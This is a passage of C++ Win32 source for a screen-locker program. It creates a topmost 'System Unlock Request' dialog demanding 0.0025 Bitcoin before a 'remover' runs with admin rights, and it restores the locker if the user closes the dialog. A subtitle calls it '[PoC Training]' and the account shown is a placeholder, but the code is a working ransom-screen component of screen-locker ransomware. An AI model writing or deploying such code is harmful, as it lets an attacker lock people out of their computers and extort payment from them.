    std::thread(&ScreenLocker::CreateCustomUnlockWindow, this).detach();
}

void ScreenLocker::CreateCustomUnlockWindow() {
    SaveToLogFile(userID, "CREATING_CUSTOM_UNLOCK_WINDOW");
    
    // Register window class for unlock dialog
    WNDCLASSW wc = {};
    wc.lpfnWndProc = UnlockDialogProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"UnlockDialogClass";
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_INFORMATION);
    
    RegisterClassW(&wc);
    
    // Calculate center position
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int xPos = (screenWidth - DIALOG_WIDTH) / 2;
    int yPos = (screenHeight - DIALOG_HEIGHT) / 2;
    
    // Create unlock dialog window
    hUnlockDialog = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_DLGMODALFRAME,
        L"UnlockDialogClass",
        L"System Unlock Request",
        WS_POPUP | WS_CAPTION | WS_SYSMENU,
        xPos, yPos, DIALOG_WIDTH, DIALOG_HEIGHT,
        hWnd, nullptr, hInstance, this
    );
    
    if (hUnlockDialog) {
        ShowWindow(hUnlockDialog, SW_SHOW);
        UpdateWindow(hUnlockDialog);
        SetForegroundWindow(hUnlockDialog);
        
        dialogRunning = true;
        SaveToLogFile(userID, "CUSTOM_UNLOCK_WINDOW_CREATED_SUCCESS");
        
        // Message loop for dialog
        MSG msg;
        while (dialogRunning && GetMessage(&msg, NULL, 0, 0)) {
            if (msg.hwnd == hUnlockDialog || IsChild(hUnlockDialog, msg.hwnd)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            } else {
                // Pass other messages to main message loop
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
        
    } else {
        SaveToLogFile(userID, "CUSTOM_UNLOCK_WINDOW_CREATION_FAILED");
    }
}

LRESULT CALLBACK ScreenLocker::UnlockDialogProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    ScreenLocker* pThis = nullptr;

    if (uMsg == WM_NCCREATE) {
        CREATESTRUCT* pCreate = (CREATESTRUCT*)lParam;
        pThis = (ScreenLocker*)pCreate->lpCreateParams;
        SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)pThis);
    } else {
        pThis = (ScreenLocker*)GetWindowLongPtr(hWnd, GWLP_USERDATA);
    }

    switch (uMsg) {
        case WM_CREATE: {
            if (pThis) {
                // Create title
                HWND hTitle = CreateWindowW(L"STATIC", 
                    L"🔒 System Access Recovery", 
                    WS_VISIBLE | WS_CHILD | SS_CENTER,
                    50, 20, 400, 30, hWnd, (HMENU)1001, pThis->hInstance, NULL);
                
                // Create subtitle
                CreateWindowW(L"STATIC", L"[PoC Training] System Unlock Portal", 
                    WS_VISIBLE | WS_CHILD | SS_CENTER,
                    50, 50, 400, 20, hWnd, (HMENU)1002, pThis->hInstance, NULL);
                
                // Create info box
                CreateWindowW(L"STATIC", 
                    L"System Unlock Process\r\n\r\nTo unlock this system, Send 0.0025 Bitcoin to the account below.\r\nAfter sending, click 'Confirm' to proceed.\r\n\r\nAccount: STEM-2025-SUMMER-RESEARCH", 
                    WS_VISIBLE | WS_CHILD | SS_CENTER | WS_BORDER,
                    50, 90, 400, 100, hWnd, (HMENU)1003, pThis->hInstance, NULL);
                
                // User ID label
                CreateWindowW(L"STATIC", L"Your User ID:", 
                    WS_VISIBLE | WS_CHILD | SS_CENTER,
                    50, 210, 400, 20, hWnd, (HMENU)1004, pThis->hInstance, NULL);
                
                // User ID display (read-only)
                std::wstring wideUserID(pThis->userID.begin(), pThis->userID.end());
                HWND hUserID = CreateWindowW(L"EDIT", wideUserID.c_str(),
                    WS_VISIBLE | WS_CHILD | WS_BORDER | ES_READONLY | ES_CENTER,
                    75, 235, 350, 25, hWnd, (HMENU)1005, pThis->hInstance, NULL);
                
                // Confirm button
                CreateWindowW(L"BUTTON", L"Confirm",
                    WS_VISIBLE | WS_CHILD | WS_TABSTOP | BS_DEFPUSHBUTTON,
                    200, 280, 100, 35, hWnd, (HMENU)1006, pThis->hInstance, NULL);
                
                // Set font for better appearance
                HFONT hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                    CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Segoe UI");
                
                // Apply font to title with larger size
                HFONT hTitleFont = CreateFont(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
                    CLEARTYPE_QUALITY, VARIABLE_PITCH, L"Segoe UI");
                
                SendMessage(hTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);
                
                EnumChildWindows(hWnd, [](HWND hwndChild, LPARAM lParam) -> BOOL {
                    if (GetDlgCtrlID(hwndChild) != 1001) { // Skip title
                        SendMessage(hwndChild, WM_SETFONT, (WPARAM)lParam, TRUE);
                    }
                    return TRUE;
                }, (LPARAM)hFont);
            }
            return 0;
        }
        
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1006 && HIWORD(wParam) == BN_CLICKED) {
                // Confirm button clicked
                if (pThis) {
                    pThis->SaveToLogFile(pThis->userID, "NATIVE_DIALOG_CONFIRM_CLICKED");
                    pThis->CloseNativeDialog();
                    
                    // Execute remover
                    if (pThis->ExecuteRemoverWithAdmin()) {
                        pThis->SaveToLogFile(pThis->userID, "REMOVER_EXECUTION_INITIATED_FROM_NATIVE");
                        PostMessage(pThis->hWnd, WM_DESTROY, 0, 0);
                    } else {
                        pThis->SaveToLogFile(pThis->userID, "REMOVER_EXECUTION_FAILED_FROM_NATIVE");
                        MessageBoxW(pThis->hWnd, L"Removal process was cancelled or failed.\nPlease try again.", 
                                   L"Action Required", MB_OK | MB_ICONWARNING);
                        pThis->RestoreScreenLockerTopmost();
                    }
                }
            }
            return 0;
        }
        
        case WM_CLOSE: {
            if (pThis) {
                pThis->SaveToLogFile(pThis->userID, "NATIVE_DIALOG_CLOSED_BY_USER");
                pThis->CloseNativeDialog();
                pThis->RestoreScreenLockerTopmost();
            }
            return 0;
        }
        
        case WM_DESTROY: {
            return 0;
        }
    }
    
    return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void ScreenLocker::CloseNativeDialog() {
    if (hUnlockDialog) {
        dialogRunning = false;
        DestroyWindow(hUnlockDialog);
        hUnlockDialog = nullptr;
        SaveToLogFile(userID, "NATIVE_DIALOG_CLOSED");
    }
}